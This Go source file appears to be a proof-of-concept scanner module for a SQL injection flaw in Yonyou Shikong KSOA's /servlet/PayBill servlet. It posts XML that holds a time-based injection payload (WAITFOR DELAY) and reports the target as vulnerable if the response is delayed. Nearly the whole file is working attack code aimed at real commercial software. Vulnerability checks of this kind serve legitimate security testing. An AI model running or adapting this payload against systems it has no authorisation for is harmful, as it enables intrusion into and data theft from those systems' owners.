package KSOA_sqljni_PayBill

import (
	"bytes"
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(10 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	// 固定值
	r1Str := "666"

	// 构建 POST 请求的 XML 数据
	xmlData := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:05';--+</name><name>1</name><name>%s</name></root>", r1Str)

	url = url + "/servlet/PayBill?caculate&_rnd="

	// 发送 POST 请求
	startTime := time.Now()
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":   UA,
		"Content-Type": "application/xml",
	}).SetBody(bytes.NewBufferString(xmlData)).Post(url)

	// 计算响应时间
	duration := time.Since(startTime)

	if err != nil {
		color.Red.Println("[-] 用友时空KSOA PayBill SQL注入漏洞不存在")
		return
	}

	// 获取响应状态码
	statusCode := resp.Response.StatusCode

	// 判断条件：响应状态为 200，响应时间超过 5 秒，并且响应体包含固定值 "666"
	if statusCode == 200 && duration > 5*time.Second && bytes.Contains(resp.Bytes(), []byte(r1Str)) {
		color.Green.Println("[+] 用友时空KSOA PayBill SQL注入漏洞存在 -> " + url)
		return
	}

	color.Red.Println("[-] 用友时空KSOA PayBill SQL注入漏洞不存在")
}
